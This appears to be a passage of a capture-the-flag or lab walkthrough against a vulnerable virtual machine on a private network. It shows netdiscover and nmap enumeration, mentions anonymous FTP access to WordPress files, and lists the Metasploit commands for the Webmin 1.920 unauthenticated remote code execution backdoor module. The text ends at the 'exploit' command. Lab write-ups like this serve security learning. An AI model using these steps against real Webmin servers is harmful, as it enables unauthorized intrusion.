### Enumeration

Firstly, a netdiscover scan will reveal how the machine can be identified on the network:

<pre>netdiscover -i eth1</pre>

Then an nmap scan:

<pre>nmap -p- -A 192.168.56.112</pre>

The port scan reveals ports 21 (ftp), 22 (ssh) and 10000 which seems to be hosting Webmin. I will attempt to connect via FTP via Anonymous. This was an extremely easy way to gain access to all the wordpress websites files, however I will be exploring other methods which require more exploitation. 

### Webmin

Some research shows a Webmin 1.920 vulnerability. I use searchsploit to find these vulnerabilities. 
I am particularly interested in the Unauthenticated Remote Code Execution.

On metasploit console, we use the webmin exploit and fill out the necessary options as demonstrated below:

<pre>msfconsole
use exploit/linux/http/webmin_backdoor
show options
set rhosts 192.168.56.112
set ssl true
set lhost 192.168.56.101</pre>

The exploit is ready to go.

<pre>exploit
